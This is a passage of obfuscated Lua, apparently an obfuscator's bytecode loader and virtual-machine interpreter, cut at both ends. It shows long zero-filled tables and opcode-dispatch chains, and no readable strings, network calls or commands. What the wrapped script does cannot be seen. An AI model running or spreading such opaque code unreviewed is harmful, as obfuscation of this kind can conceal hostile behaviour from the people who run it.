0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};local A={0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};local d={};local f={B,nil,A,nil,d};f[4]=c();for f=1,e()do local n=l(e(),2);local e=l(e(),179);local l=o(n,1,2);local d=o(e,1,11);local d={d,o(n,3,11),nil,nil,e};if(l==0)then d[3]=o(n,12,20);d[5]=o(n,21,29);elseif(l==1)then d[3]=o(e,12,33);elseif(l==2)then d[3]=o(e,12,32)-1048575;elseif(l==3)then d[3]=o(e,12,32)-1048575;d[5]=o(n,21,29);end;B[f]=d;end;for o=1,e()do A[o-1]=H();end;local o=e()local e={0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};for l=1,o do local d=c();local o;if(d==2)then o=(c()~=0);elseif(d==0)then o=D();elseif(d==1)then o=J();end;e[l]=o;end;f[2]=e return f;end;local function K(o,C,f)local l=o[1];local e=o[2];local d=o[3];local o=o[4];return function(...)local l=l;local n=e;local E=d;local c=o;local J=a local d=1;local B=-1;local W={};local D={...};local a=S('#',...)-1;local T={};local e={};for o=0,a do if(o>=c)then W[o-c]=D[o+1];else e[o]=D[o+1];end;end;local o=a-c+1 local o;local c;while true do o=l[d];c=o[1];if c<=165 then if c<=82 then if c<=40 then if c<=19 then if c<=9 then if c<=4 then if c<=1 then if c==0 then e[o[2]]=(o[3]~=0);else local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];end;elseif c<=2 then local D;local a;local A;local C;local c;c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];elseif c==3 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];d=d+o[3];else e[o[2]]={};end;elseif c<=6 then if c==5 then local J;local a;local A;local D;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];c=o[2];D={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;D[A]=e[o];end;J={e[c](r(D,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=J[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];do return end;else e[o[2]]=n[o[3]]*e[o[5]];end;elseif c<=7 then local C;local c;local f;local a;local A;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];A=o[2];a={};f=0;c=A+o[3]-1;for o=A+1,c do f=f+1;a[f]=e[o];end;C={e[A](r(a,1,c-A))};c=A+o[5]-2;f=0;for o=A,c do f=f+1;e[o]=C[f];end;B=c;elseif c>8 then local D;local c;local A;local C;local a;local f;f=o[2];a=e[o[3]];e[f+1]=a;e[f]=a[n[o[5]]];d=d+1;o=l[d];f=o[2];C={};A=0;c=f+o[3]-1;for o=f+1,c do A=A+1;C[A]=e[o];end;D={e[f](r(C,1,c-f))};c=f+o[5]-2;A=0;for o=f,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];for o=o[2],o[3]do e[o]=nil;end;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];else if(n[o[2]]<e[o[5]])then d=d+1;else d=d+o[3];end;end;elseif c<=14 then if c<=11 then if c>10 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];else local J;local a;local A;local D;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];c=o[2];D={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;D[A]=e[o];end;J={e[c](r(D,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=J[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];end;elseif c<=12 then e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];d=d+o[3];elseif c==13 then e[o[2]]=e[o[3]]+n[o[5]];else local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do 